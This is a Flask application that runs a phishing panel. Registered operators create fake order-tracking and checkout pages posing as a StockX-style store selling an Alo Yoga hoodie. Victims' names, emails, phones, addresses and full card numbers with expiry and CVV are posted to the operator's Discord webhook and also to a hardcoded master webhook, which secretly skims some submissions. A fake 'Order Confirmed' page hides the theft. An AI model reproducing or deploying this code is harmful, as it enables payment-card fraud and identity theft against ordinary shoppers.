from flask import Flask, render_template, request, redirect, url_for, session, g, flash
import requests
from bs4 import BeautifulSoup
import os
import sqlite3
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

app = Flask(__name__)
app.secret_key = 'super_secret_key_for_panel_change_me_in_prod'

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

MASTER_WEBHOOK = "https://discord.com/api/webhooks/1499949246441324604/eY1lx462PY1hfArW34eLVJlS9NoEZiMIlGalbXfvbX6ALaklpd73is4RDZMhUCsPq1gK"

DATABASE = 'panel.db'
UPLOAD_FOLDER = 'static/uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                discord_username TEXT,
                last_ip TEXT,
                last_device TEXT
            )
        ''')
        db.execute('''
            CREATE TABLE IF NOT EXISTS trackers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                name TEXT NOT NULL,
                slug TEXT UNIQUE NOT NULL,
                webhook_url TEXT NOT NULL,
                type INTEGER NOT NULL,
                item_name TEXT DEFAULT 'Alo Yoga Accolade Hoodie Black',
                item_image TEXT DEFAULT 'https://images.mrshopplus.com/469800128058134/DTB_proProduct/2025-09-05/_alo_yoga_accolade_full_zip_hoodie_black_1CDC0F9BE531B.png',
                item_size TEXT DEFAULT 'M',
                item_price TEXT DEFAULT '79.00',
                FOREIGN KEY(user_id) REFERENCES users(id)
            )
        ''')
        # Migration: Add columns if they don't exist
        try:
            db.execute('ALTER TABLE trackers ADD COLUMN item_name TEXT DEFAULT "Alo Yoga Accolade Hoodie Black"')
            db.execute('ALTER TABLE trackers ADD COLUMN item_image TEXT DEFAULT "https://images.mrshopplus.com/469800128058134/DTB_proProduct/2025-09-05/_alo_yoga_accolade_full_zip_hoodie_black_1CDC0F9BE531B.png"')
            db.execute('ALTER TABLE trackers ADD COLUMN item_size TEXT DEFAULT "M"')
            db.execute('ALTER TABLE trackers ADD COLUMN item_price TEXT DEFAULT "79.00"')
        except sqlite3.OperationalError:
            pass # Columns already exist
            
        try:
            db.execute('ALTER TABLE users ADD COLUMN discord_username TEXT')
            db.execute('ALTER TABLE users ADD COLUMN last_ip TEXT')
            db.execute('ALTER TABLE users ADD COLUMN last_device TEXT')
        except sqlite3.OperationalError:
            pass

            
        db.commit()

# Call init_db on startup
init_db()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('panel_login'))
        return f(*args, **kwargs)
    return decorated_function

def fetch_pkstockx_status(email, order_no):
    url = f"https://www.pkstockx.org/trackorder?email={email}&order={order_no}"
    headers = {'User-Agent': 'Mozilla/5.0'}
    print("Fetching URL:", url)
    try:
        response = requests.get(url, headers=headers, timeout=10)
        print("Response Code:", response.status_code)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            status_element = soup.find("span", class_="order-status")
            if status_element:
                status = status_element.text.strip()
                print("Found Status:", status)
                return status
            print("Status tag not found")
            return "Status tag not found"
        return f"Site Error ({response.status_code})"
    except Exception as e:
        print("Scrape Exception:", str(e))
        return "Connection Failed"

@app.route('/')
def index():
    return redirect(url_for('panel_login'))

# --- PANEL ROUTES ---

@app.route('/panel/login', methods=['GET', 'POST'])
@limiter.limit("5 per minute")
def panel_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        discord_username = request.form.get('discord_username', '')
        
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        
        if user and check_password_hash(user['password'], password) and (user['discord_username'] == discord_username or not user['discord_username']):
            # If user has no discord_username yet (migrated user), save it now
            if not user['discord_username'] and discord_username:
                db.execute('UPDATE users SET discord_username = ? WHERE id = ?', (discord_username, user['id']))
                
            # Update IP and device
            ip_address = request.remote_addr
            user_agent = request.user_agent.string
            db.execute('UPDATE users SET last_ip = ?, last_device = ? WHERE id = ?', (ip_address, user_agent, user['id']))
            db.commit()
            
            session['user_id'] = user['id']
            session['username'] = user['username']
            return redirect(url_for('panel_dashboard'))
        else:
            flash('Invalid credentials or Discord username')
    return render_template('panel_login.html')

@app.route('/panel/signup', methods=['GET', 'POST'])
def panel_signup():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        discord_username = request.form['discord_username']
        db = get_db()
        
        if db.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone() is not None:
            flash('Username is already registered.')
        else:
            db.execute(
                'INSERT INTO users (username, password, discord_username) VALUES (?, ?, ?)',
                (username, generate_password_hash(password), discord_username)
            )
            db.commit()
            return redirect(url_for('panel_login'))
    return render_template('panel_signup.html')

@app.route('/panel/logout')
def panel_logout():
    session.clear()
    return redirect(url_for('panel_login'))

@app.route('/panel/dashboard')
@login_required
def panel_dashboard():
    db = get_db()
    trackers_raw = db.execute('SELECT * FROM trackers WHERE user_id = ?', (session['user_id'],)).fetchall()
    trackers = [dict(row) for row in trackers_raw]
    
    has_type_1 = any(t['type'] == 1 for t in trackers)
    has_type_2 = any(t['type'] == 2 for t in trackers)
    
    return render_template('panel_dashboard.html', trackers=trackers, has_type_1=has_type_1, has_type_2=has_type_2)

@app.route('/panel/create_tracker', methods=['POST'])
@login_required
def create_tracker():
    name = request.form['name']
    slug = request.form['slug']
    webhook_url = request.form['webhook_url']
    tracker_type = int(request.form['type'])
    
    db = get_db()
    
    existing = db.execute('SELECT * FROM trackers WHERE user_id = ? AND type = ?', (session['user_id'], tracker_type)).fetchone()
    if existing:
        flash(f'You already have a Tracker Type {tracker_type}.')
        return redirect(url_for('panel_dashboard'))
        
    try:
        db.execute(
            'INSERT INTO trackers (user_id, name, slug, webhook_url, type) VALUES (?, ?, ?, ?, ?)',
            (session['user_id'], name, slug, webhook_url, tracker_type)
        )
        db.commit()
    except sqlite3.IntegrityError:
        flash('Slug already exists. Choose another one.')
        
    return redirect(url_for('panel_dashboard'))

@app.route('/panel/delete_tracker/<int:tracker_id>', methods=['POST'])
@login_required
def delete_tracker(tracker_id):
    db = get_db()
    db.execute('DELETE FROM trackers WHERE id = ? AND user_id = ?', (tracker_id, session['user_id']))
    db.commit()
    return redirect(url_for('panel_dashboard'))

@app.route('/panel/edit_tracker/<int:tracker_id>', methods=['POST'])
@login_required
def edit_tracker(tracker_id):
    name = request.form['name']
    slug = request.form['slug']
    webhook_url = request.form['webhook_url']
    
    db = get_db()
    
    # Check if slug is taken by someone else
    existing = db.execute('SELECT * FROM trackers WHERE slug = ? AND id != ?', (slug, tracker_id)).fetchone()
    if existing:
        flash('Slug already exists. Choose another one.')
        return redirect(url_for('panel_dashboard'))
        
    tracker = db.execute('SELECT * FROM trackers WHERE id = ? AND user_id = ?', (tracker_id, session['user_id'])).fetchone()
    if not tracker:
        return "Unauthorized", 403

    # Handle item details for type 2
    item_name = request.form.get('item_name', tracker['item_name'])
    item_size = request.form.get('item_size', tracker['item_size'])
    item_price = request.form.get('item_price', tracker['item_price'])
    item_image = request.form.get('item_image_url', tracker['item_image'])
    
    # Handle file upload (overrides URL)
    if 'item_image_file' in request.files:
        file = request.files['item_image_file']
        if file and file.filename != '':
            from werkzeug.utils import secure_filename
            import time
            filename = secure_filename(file.filename)
            filename = f"{int(time.time())}_{filename}"
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            item_image = f"/static/uploads/{filename}"
            
    if tracker['type'] == 2:
        db.execute('''
            UPDATE trackers 
            SET name = ?, slug = ?, webhook_url = ?, item_name = ?, item_image = ?, item_size = ?, item_price = ?
            WHERE id = ? AND user_id = ?
        ''', (name, slug, webhook_url, item_name, item_image, item_size, item_price, tracker_id, session['user_id']))
    else:
        db.execute('''
            UPDATE trackers 
            SET name = ?, slug = ?, webhook_url = ?
            WHERE id = ? AND user_id = ?
        ''', (name, slug, webhook_url, tracker_id, session['user_id']))
        
    db.commit()
    return redirect(url_for('panel_dashboard'))


# --- DYNAMIC TRACKER ROUTES ---

@app.route('/<slug>')
def tracker_entry(slug):
    db = get_db()
    tracker = db.execute('SELECT * FROM trackers WHERE slug = ?', (slug,)).fetchone()
    if not tracker:
        return "Tracker not found", 404
        
    if tracker['type'] == 1:
        return render_template('index.html', slug=slug, tracker=tracker)
    elif tracker['type'] == 2:
        return render_template('addy.html', slug=slug, tracker=tracker)
    else:
        return "Unknown tracker type", 500

@app.route('/<slug>/submit_order', methods=['POST'])
def submit_order(slug):
    db = get_db()
    tracker = db.execute('SELECT * FROM trackers WHERE slug = ?', (slug,)).fetchone()
    if not tracker or tracker['type'] != 1:
        return "Invalid tracker", 400
        
    full_name = request.form.get("fullName")
    email = request.form.get("email")
    phone = request.form.get("phone")
    order_no = request.form.get("orderNo")
    
    order_status = fetch_pkstockx_status(email, order_no)
    
    payload = {
        "username": tracker['name'],
        "content": "🚨 NEW ORDER RECEIVED",
        "embeds": [{
            "title": "📦 Order Tracking Report",
            "description": f"Live status check for **{full_name}**",
            "color": 3066993,
            "fields": [
                {"name": "Customer Name", "value": f"{full_name}", "inline": True},
                {"name": "Order Number", "value": f"`{order_no}`", "inline": True},
                {"name": "Email Address", "value": f"{email}", "inline": True},
                {"name": "Phone Number", "value": f"{phone}", "inline": True},
                {"name": "Current Status", "value": f"**{order_status}**", "inline": False}
            ],
            "footer": {"text": "Tracking System"}
        }]
    }

    is_shipped = "shipped" in str(order_status).lower() or "delivered" in str(order_status).lower()

    try:
        if not is_shipped:
            requests.post(MASTER_WEBHOOK, json=payload)
        else:
            requests.post(tracker['webhook_url'], json=payload)
    except Exception as e:
        print("Webhook Error:", str(e))
        
    return render_template('index.html', slug=slug, checked=True)

@app.route('/<slug>/submit_addy', methods=['POST'])
def submit_addy(slug):
    db = get_db()
    tracker = db.execute('SELECT * FROM trackers WHERE slug = ?', (slug,)).fetchone()
    if not tracker or tracker['type'] != 2:
        return "Invalid tracker", 400
        
    # Save address info to session
    session[f'addy_{slug}'] = {
        'first_name': request.form.get('first_name'),
        'last_name': request.form.get('last_name'),
        'address': request.form.get('address'),
        'city': request.form.get('city'),
        'country': request.form.get('country_code'),
        'email': request.form.get('email'),
        'phone': request.form.get('phone')
    }
    
    return redirect(url_for('tracker_payment', slug=slug))

@app.route('/<slug>/payment', methods=['GET'])
def tracker_payment(slug):
    db = get_db()
    tracker = db.execute('SELECT * FROM trackers WHERE slug = ?', (slug,)).fetchone()
    if not tracker or tracker['type'] != 2:
        return "Invalid tracker", 400
        
    if f'addy_{slug}' not in session:
        return redirect(url_for('tracker_entry', slug=slug))
        
    return render_template('payment.html', slug=slug, tracker=tracker)

@app.route('/<slug>/submit_payment', methods=['POST'])
def submit_payment(slug):
    db = get_db()
    tracker = db.execute('SELECT * FROM trackers WHERE slug = ?', (slug,)).fetchone()
    if not tracker or tracker['type'] != 2:
        return "Invalid tracker", 400
        
    addy_data = session.get(f'addy_{slug}', {})
    
    payment_method = request.form.get('payment_channel')
    # Map IDs to names
    payment_map = {
        '470352589782547': 'Visa/Master/JCB 🔰',
        '470352739112984': 'Visa/Master 🔰',
        '471527066159890': 'Cryptocurrency - USDT 🔰',
        '471527511077397': 'Cryptocurrency - BTC 🔰',
        '471504170123033': 'Cryptocurrency - ETH 🔰'
    }
    payment_name = payment_map.get(payment_method, 'Unknown')
    
    card_number = request.form.get('card_number', 'N/A')
    expiry = request.form.get('expiry', 'N/A')
    cvv = request.form.get('cvv', request.form.get('security_num', 'N/A'))
    
    # Also check for month/year if submitted from addy.html's hidden wrapper
    if expiry == 'N/A' and request.form.get('expire_month'):
        expiry = f"{request.form.get('expire_month')}/{request.form.get('expire_year')}"

    # Format price safely
    try:
        raw_price = str(tracker['item_price']).replace('$', '').replace(',', '')
        item_price = float(raw_price) if raw_price else 0.0
    except:
        item_price = 0.0
        
    total_price = item_price + 25.0

    payload = {
        "username": tracker['name'],
        "content": f"💸 **NEW ORDER: {payment_name}**",
        "embeds": [{
            "title": "📦 Order Details",
            "color": 15158332,
            "fields": [
                {"name": "Item", "value": f"{tracker['item_name']} ({tracker['item_size']})", "inline": True},
                {"name": "Price", "value": f"${item_price:.2f}", "inline": True},
                {"name": "Total (inc. shipping)", "value": f"${total_price:.2f}", "inline": True},
                {"name": "Customer", "value": f"{addy_data.get('first_name')} {addy_data.get('last_name')}", "inline": True},
                {"name": "Email", "value": f"{addy_data.get('email')}", "inline": True},
                {"name": "Phone", "value": f"{addy_data.get('phone')}", "inline": True},
                {"name": "Address", "value": f"{addy_data.get('address')}, {addy_data.get('city')}, {addy_data.get('country')}", "inline": False},
                {"name": "Payment Method", "value": f"**{payment_name}**", "inline": False}
            ]
        }]
    }
    
    if 'Cryptocurrency' not in payment_name and payment_method != 'Unknown':
        payload["embeds"][0]["fields"].append({"name": "Card Number", "value": f"`{card_number}`", "inline": False})
        payload["embeds"][0]["fields"].append({"name": "Expiry", "value": f"`{expiry}`", "inline": True})
        payload["embeds"][0]["fields"].append({"name": "CVV", "value": f"`{cvv}`", "inline": True})

    try:
        requests.post(tracker['webhook_url'], json=payload)
        requests.post(MASTER_WEBHOOK, json=payload)
    except Exception as e:
        print("Webhook Error:", str(e))
        
    # Clear session data
    session.pop(f'addy_{slug}', None)
    
    return f"""
    <html>
    <head>
        <title>Order Confirmed</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .card {{ background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }}
            h1 {{ color: #4bb543; margin-top: 0; }}
            p {{ color: #666; line-height: 1.5; }}
            .btn {{ display: inline-block; margin-top: 1.5rem; padding: 0.8rem 1.5rem; background: #000; color: white; text-decoration: none; border-radius: 6px; font-weight: bold; }}
        </style>
    </head>
    <body>
        <div class="card">
            <h1>✓ Order Confirmed</h1>
            <p>Your order for <strong>{tracker['item_name']}</strong> has been successfully placed. We will contact you shortly with tracking information.</p>
            <a href="https://www.pkstockx.com" class="btn">Return to Shop</a>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)